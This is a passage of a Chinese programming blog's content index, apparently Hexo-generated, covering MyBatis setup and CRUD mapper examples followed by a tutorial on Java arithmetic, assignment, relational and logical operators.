class="title">getUser</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在resources目录下实现接口配置文件(文件名随意)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.gwl.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUser&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.gwl.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        select * from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在Test目录下编写测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserMapperTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line">        UserMapper mapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">        List&lt;User&gt; user = mapper.getUser();</span><br><span class="line">        user.forEach(System.out::println);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>启动运行代码</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> mybatis框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据存储框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis入门(二)</title>
      <link href="/2021/11/04/Mybatis%E5%85%A5%E9%97%A8(%E4%BA%8C)/"/>
      <url>/2021/11/04/Mybatis%E5%85%A5%E9%97%A8(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<center><h1>Mybatis入门(二)</h1></center><h1 id="Mybatis增删改查"><a href="#Mybatis增删改查" class="headerlink" title="Mybatis增删改查"></a>Mybatis增删改查</h1><ul><li>选择，查询语句<ul><li>id: 就是应对的namespace中的方法名</li><li>resultType: Sql语句的执行返回值</li><li>prarmeterType: 参数类型</li></ul></li><li><code>增删改需要提交事物</code></li></ul><hr><h2 id="Select语句"><a href="#Select语句" class="headerlink" title="Select语句"></a>Select语句</h2><ol><li><p>编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据id查询用户</span></span><br><span class="line">    <span class="function">User <span class="title">getUserById</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.gwl.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        select * from user where id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>测试 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line">        UserMapper mapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">        User userById = mapper.getUserById(<span class="number">2</span>);</span><br><span class="line">        System.out.println(userById);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="Insert语句"><a href="#Insert语句" class="headerlink" title="Insert语句"></a>Insert语句</h2><ol><li><p>编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  插入用户insert</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">addUser</span><span class="params">(User user)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;addUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.gwl.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        insert into user (id, name, owd) values (#&#123;id&#125;, #&#123;name&#125;, #&#123;owd&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line">    UserMapper mapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    mapper.addUser(<span class="keyword">new</span> User(<span class="number">6</span>, <span class="string">&quot;python&quot;</span>, <span class="string">&quot;12345&quot;</span>));</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="Update语句"><a href="#Update语句" class="headerlink" title="Update语句"></a>Update语句</h2><ol><li><p>编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 更新数据</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">upDataUser</span><span class="params">(User user)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;upDataUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.gwl.pojo.User&quot;</span>&gt;</span></span><br><span class="line">       update user set name=#&#123;name&#125;, owd=#&#123;owd&#125; where id = #&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updataUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line">    UserMapper mapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    mapper.upDataUser(<span class="keyword">new</span> User(<span class="number">1</span>, <span class="string">&quot;hh&quot;</span>, <span class="string">&quot;1234&quot;</span>));</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="Delete语句"><a href="#Delete语句" class="headerlink" title="Delete语句"></a>Delete语句</h2><ol><li><p>编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    删除一个用户</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">deleteUser</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>编写对应的mapper中的sql语句</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">       delete from user where id = 2;</span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dele</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line">    UserMapper mapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    mapper.deleteUser(<span class="number">2</span>);</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="传递Map集合"><a href="#传递Map集合" class="headerlink" title="传递Map集合"></a>传递Map集合</h2><ol><li><p>编写接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// map方式</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">insertUserDate</span><span class="params">(Map&lt;String, Object&gt; hmp)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>编写对应的mapper</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertUserDate&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;map&quot;</span>&gt;</span></span><br><span class="line">    insert into user (id, name, owd) values (#&#123;userid&#125;, #&#123;username&#125;, #&#123;userpwd&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inserUserDate</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqlSession sqlSession = MybatisUtils.getSqlSession();</span><br><span class="line">    UserMapper mapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    Map&lt;String, Object&gt; hmp = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">    hmp.put(<span class="string">&quot;userid&quot;</span>, <span class="number">7</span>);</span><br><span class="line">    hmp.put(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;java&quot;</span>);</span><br><span class="line">    hmp.put(<span class="string">&quot;userpwd&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">    mapper.insertUserDate(hmp);</span><br><span class="line">    sqlSession.commit();</span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>map的主键要和mapper中的#&#123;&#125;里面的值一一对应</code></li><li>map传递参数，直接在sql中取出key</li><li>对象传递参数，直接在sql中取对象的属性</li><li>只有一个基本类型参数的情况下，可以直接在sql中取到</li></ul></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> mybatis框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据存储框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java运算符号和分支语句</title>
      <link href="/2021/11/04/Java%E8%BF%90%E7%AE%97%E7%AC%A6%E5%8F%B7%E5%92%8C%E5%88%86%E6%94%AF%E8%AF%AD%E5%8F%A5/"/>
      <url>/2021/11/04/Java%E8%BF%90%E7%AE%97%E7%AC%A6%E5%8F%B7%E5%92%8C%E5%88%86%E6%94%AF%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<center><h1>运算符和分支语句</h1></center><h2 id="运算法和表达式"><a href="#运算法和表达式" class="headerlink" title="运算法和表达式"></a>运算法和表达式</h2><ul><li><p>运算符: 对常量或者变量进行操作的符号</p></li><li><p>表达式: 用运算符把常量或者变量连接起来符合java语法的式子就可以称为表达式 </p></li><li><p>不同运算副连接的表达式体现的是不同类型的表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">int</span> c = a + b;</span><br></pre></td></tr></table></figure><blockquote><p>+ :是运算符</p><p>a+b: 是表达式， 由于+是算术运算符，所以这个表达式叫算术表达式</p></blockquote></li></ul><hr><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><ul><li><table><thead><tr><th>符号</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>+</td><td>加</td><td>两数相加</td></tr><tr><td>-</td><td>减</td><td>两数相减</td></tr><tr><td>*</td><td>乘</td><td>两数相乘</td></tr><tr><td>/</td><td>除</td><td>两数相除</td></tr><tr><td>%</td><td>取余</td><td>获取两个数据做除法的余数</td></tr></tbody></table></li><li><blockquote><p>/和%的区别: 两个数据做除法, /取结果的商, %取结果的余数</p><p>整数操作只能得到整数, 想要得到小数, 必须有浮点数参与运算</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">3</span>;</span><br><span class="line">System.out.println(a/b); <span class="comment">// 输出结果3</span></span><br><span class="line">System.out.println(a%b); <span class="comment">//输出结果1</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="字符的-操作"><a href="#字符的-操作" class="headerlink" title="字符的+操作"></a><strong>字符</strong>的+操作</h2><ul><li><p>char类型参与算术运算，使用的是计算机底层对应的十进制数值。需要我们记住三个字符对应的数值</p><ul><li><p>‘a’ – 97 a-z是连续的，所以’b’对应的数值是98，’c’是99，依次递加</p></li><li><p>‘A’ – 65 A-Z是连续的，所以’B’对应的数值是66，’C’是67，依次递加</p></li><li><p>‘0’ – 48 0-9是连续的，所以’1’对应的数值是49，’2’是50，依次递加</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可以通过使用字符与整数做算术运算，得出字符对应的数值是多少</span></span><br><span class="line"><span class="keyword">char</span> ch1 = <span class="string">&#x27;a&#x27;</span>; </span><br><span class="line">System.out.println(ch1 + <span class="number">1</span>); <span class="comment">// 输出98，97 + 1 = 98 </span></span><br><span class="line"><span class="keyword">char</span> ch2 = <span class="string">&#x27;A&#x27;</span>; </span><br><span class="line">System.out.println(ch2 + <span class="number">1</span>); <span class="comment">// 输出66，65 + 1 = 66 </span></span><br><span class="line"><span class="keyword">char</span> ch3 = <span class="string">&#x27;0&#x27;</span>; </span><br><span class="line">System.out.println(ch3 + <span class="number">1</span>); <span class="comment">// 输出49，48 + 1 = 49</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>算术表达式中包含不同的基本数据类型的值的时候，整个算术表达式的类型会自动进行提升</p><ul><li><h2 id="提升规则"><a href="#提升规则" class="headerlink" title="提升规则"></a>提升规则</h2><ul><li><p>byte类型，short类型和char类型将被提升到int类型，不管是否有其他类型参与运算。</p></li><li><p>整个表达式的类型自动提升到与表达式中最高等级的操作数相同的类型</p></li><li><p>等级顺序：byte,short,char –&gt; int –&gt; long –&gt; flfloat –&gt; double</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span> b1 = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">byte</span> b2 = <span class="number">20</span>; <span class="comment">// byte b3 = b1 + b2;</span></span><br><span class="line"><span class="comment">// 该行报错，因为byte类型参与算术运算会自动提示为int，int赋值给byte可能损失 精度</span></span><br><span class="line"><span class="keyword">int</span> i3 = b1 + b2; <span class="comment">// 应该使用int接收 </span></span><br><span class="line"><span class="keyword">byte</span> b3 = (<span class="keyword">byte</span>) (b1 + b2); <span class="comment">// 或者将结果强制转换为byte类型 </span></span><br><span class="line">------------------------------- </span><br><span class="line"><span class="keyword">int</span> num1 = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">double</span> num2 = <span class="number">20.0</span>;</span><br><span class="line"><span class="keyword">double</span> num3 = num1 + num2; <span class="comment">// 使用double接收，因为num1会自动提升为double类型</span></span><br></pre></td></tr></table></figure><blockquote><p>tips：正是由于上述原因，所以在程序开发中我们很少使用byte或者short类型定义整数。也很少会使用char类型定</p><p>义字符，而使用字符串类型，更不会使用char类型做算术运算。</p></blockquote></li></ul></li></ul></li></ul><hr><h2 id="字符串的-操作"><a href="#字符串的-操作" class="headerlink" title="字符串的+操作"></a><strong>字符串</strong>的+操作</h2><ul><li><p>当“+”操作中出现字符串时，这个”+”是字符串连接符，而不是算术运算。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;java&quot;</span>+ <span class="number">666</span>); <span class="comment">// 输出：java666</span></span><br></pre></td></tr></table></figure></li><li><p>在”+”操作中，如果出现了字符串，就是连接运算符，否则就是算术运算。当连续进行“+”操作时，从左到右逐个执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="number">1</span> + <span class="number">99</span> + <span class="string">&quot;年&quot;</span>); <span class="comment">// 输出：199年黑马 </span></span><br><span class="line">System.out.println(<span class="number">1</span> + <span class="number">2</span> + <span class="string">&quot;java&quot;</span> + <span class="number">3</span> + <span class="number">4</span>); <span class="comment">// 输出：3java34 </span></span><br><span class="line"><span class="comment">// 可以使用小括号改变运算的优先级 </span></span><br><span class="line">System.out.println(<span class="number">1</span> + <span class="number">2</span> + <span class="string">&quot;java&quot;</span> + (<span class="number">3</span> + <span class="number">4</span>)); <span class="comment">// 输出：3java7</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><ul><li><p>赋值运算符的作用是将一个表达式的值赋给左边，左边必须是可修改的，不能是常量。</p></li><li><table><thead><tr><th align="center"><strong>符号</strong></th><th align="center"><strong>作用</strong></th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">=</td><td align="center">赋值</td><td align="center">a=10，将10赋值给变量a</td></tr><tr><td align="center">+=</td><td align="center">加后赋值</td><td align="center">a+=b，将a+b的值给a</td></tr><tr><td align="center">-=</td><td align="center">减后赋值</td><td align="center">a-=b，将a-b的值给a</td></tr><tr><td align="center">*=</td><td align="center">乘后赋值</td><td align="center">a*=b，将a×b的值给a</td></tr><tr><td align="center">/=</td><td align="center">除后赋值</td><td align="center">a/=b，将a÷b的商给a</td></tr><tr><td align="center">%=</td><td align="center">取余后赋值</td><td align="center">a%=b，将a÷b的余数给a</td></tr></tbody></table><blockquote><p>扩展的赋值运算符隐含了强制类型转换</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">short</span> s = <span class="number">10</span>;</span><br><span class="line">s = s + <span class="number">10</span>; <span class="comment">// 此行代码报出，因为运算中s提升为int类型，运算结果int赋值给short可能损失精度 </span></span><br><span class="line">s += <span class="number">10</span>; <span class="comment">// 此行代码没有问题，隐含了强制类型转换，相当于 s = (short) (s + 10);</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="自增自减运算符"><a href="#自增自减运算符" class="headerlink" title="自增自减运算符"></a>自增自减运算符</h2><ul><li><table><thead><tr><th>符号</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>++</td><td>自增</td><td>变量的值加1</td></tr><tr><td>–</td><td>自减</td><td>变量的值减1</td></tr></tbody></table></li><li><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项:"></a>注意事项:</h2><ul><li>++和– 既可以放在变量的后边，也可以放在变量的前边</li><li>单独使用的时候， ++和– 无论是放在变量的前边还是后边，结果是一样的</li><li>参与操作的时候，如果放在变量的后边，先拿变量参与操作，后拿变量做++或者–</li><li>参与操作的时候，如果放在变量的前边，先拿变量做++或者–，后拿变量参与操作</li></ul></li><li><p>最常见的用法：单独使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">10</span>; i++; <span class="comment">// 单独使用 </span></span><br><span class="line">System.out.println(<span class="string">&quot;i:&quot;</span> + i); <span class="comment">// i:11 </span></span><br><span class="line"><span class="keyword">int</span> j = <span class="number">10</span>;</span><br><span class="line">++j; <span class="comment">// 单独使用 </span></span><br><span class="line">System.out.println(<span class="string">&quot;j:&quot;</span> + j); <span class="comment">// j:11 </span></span><br><span class="line"><span class="keyword">int</span> x = <span class="number">10</span>; </span><br><span class="line"><span class="keyword">int</span> y = x++; <span class="comment">// 赋值运算，++在后边，所以是使用x原来的值赋值给y，x本身自增1 </span></span><br><span class="line">System.out.println(<span class="string">&quot;x:&quot;</span> + x + <span class="string">&quot;, y:&quot;</span> + y); <span class="comment">// x:11，y:10 </span></span><br><span class="line"><span class="keyword">int</span> m = <span class="number">10</span>; </span><br><span class="line"><span class="keyword">int</span> n = ++m; <span class="comment">// 赋值运算，++在前边，所以是使用m自增后的值赋值给n，m本身自增1 </span></span><br><span class="line">System.out.println(<span class="string">&quot;m:&quot;</span> + m + <span class="string">&quot;, m:&quot;</span> + m); <span class="comment">// m:11，m:11</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h2><ul><li><p>关系运算符有6种关系，分别为小于、小于等于、大于、等于、大于等于、不等于</p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>==</td><td>a==b，判断a和b的值是否相等，成立为true，不成立为false</td></tr><tr><td>!=</td><td>a!=b，判断a和b的值是否不相等，成立为true，不成立为false</td></tr><tr><td>&gt;</td><td>a&gt;b，判断a是否大于b，成立为true，不成立为false</td></tr><tr><td>&gt;=</td><td>a&gt;=b，判断a是否大于等于b，成立为true，不成立为false</td></tr><tr><td>&lt;</td><td>a&lt;b，判断a是否小于b，成立为true，不成立为false</td></tr><tr><td>&lt;=</td><td>a&lt;=b，判断a是否小于等于b，成立为true，不成立为false</td></tr></tbody></table><blockquote><p>关系运算符的结果都是boolean类型，要么是true，要么是false</p><p>千万不要把**“==”误写成“=”，”==”**是判断是否相等的关系，”=”是赋值</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;<span class="keyword">int</span> b = <span class="number">20</span>;System.out.println(a == b); <span class="comment">// false System.out.println(a != b); // true System.out.println(a &gt; b); // false System.out.println(a &gt;= b); // false System.out.println(a &lt; b); // true System.out.println(a &lt;= b); // true// 关系运算的结果肯定是boolean类型，所以也可以将运算结果赋值给boolean类型的变量 boolean flag = a &gt; b; System.out.println(flag); // 输出false</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><ul><li><p>逻辑运算符把各个运算的关系表达式连接起来组成一个复杂的逻辑表达式，以判断程序中的表达式是否成立，判断的结果是 true 或 false</p><table><thead><tr><th align="center">符号</th><th align="center">作用</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">&amp;</td><td align="center">逻辑与</td><td align="center">a&amp;b，a和b都是true，结果为true，否则为false</td></tr><tr><td align="center">|</td><td align="center">逻辑或</td><td align="center">a|b, a和b都是false, 结果为false, 否则为true</td></tr><tr><td align="center">^</td><td align="center">逻辑异或</td><td align="center">a^b，a和b结果不同为true，相同为false</td></tr><tr><td align="center">!</td><td align="center">逻辑非</td><td align="center">!a，结果和a的结果正好相反</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义变量 int i = 10; int j = 20; int k = 30; //&amp; “与”，并且的关系，只要表达式中有一个值为false，结果即为false System.out.println((i &gt; j) &amp; (i &gt; k)); //false &amp; false,输出false System.out.println((i &lt; j) &amp; (i &gt; k)); //true &amp; false,输出false System.out.println((i &gt; j) &amp; (i &lt; k)); //false &amp; true,输出false System.out.println((i &lt; j) &amp; (i &lt; k)); //true &amp; true,输出true System.out.println(&quot;--------&quot;);//| “或”，或者的关系，只要表达式中有一个值为true，结果即为true System.out.println((i &gt; j) | (i &gt; k)); //false | false,输出false System.out.println((i &lt; j) | (i &gt; k)); //true | false,输出true System.out.println((i &gt; j) | (i &lt; k)); //false | true,输出true System.out.println((i &lt; j) | (i &lt; k)); //true | true,输出true System.out.println(&quot;--------&quot;);//^ “异或”，相同为false，不同为true System.out.println((i &gt; j) ^ (i &gt; k)); //false ^ false,输出false System.out.println((i &lt; j) ^ (i &gt; k)); //true ^ false,输出trueSystem.out.println((i &gt; j) ^ (i &lt; k)); //false ^ true,输出true System.out.println((i &lt; j) ^ (i &lt; k)); //true ^ true,输出false System.out.println(&quot;--------&quot;);//! “非”，取反 System.out.println((i &gt; j)); //false System.out.println(!(i &gt; j)); //!false，,输出true</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="短路逻辑运算符"><a href="#短路逻辑运算符" class="headerlink" title="短路逻辑运算符"></a>短路逻辑运算符</h2><ul><li><table><thead><tr><th>符号</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>短路与</td><td>作用和&amp;相同，但是有短路效果</td></tr><tr><td>||</td><td>短路或</td><td>作用和</td></tr></tbody></table><p>在逻辑与运算中，只要有一个表达式的值为false，那么结果就可以判定为false了，没有必要将所有表达式的值都计算出来，短路与操作就有这样的效果，可以提高效率。同理在逻辑或运算中，一旦发现值为true，右边的表达式将不再参与运算。</p><ul><li><p>逻辑与&amp;，无论左边真假，右边都要执行</p></li><li><p>短路与&amp;&amp;，如果左边为真，右边执行；如果左边为假，右边不执行</p></li><li><p>逻辑或|，无论左边真假，右边都要执行</p></li><li><p>短路或||，如果左边为假，右边执行；如果左边为真，右边不执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 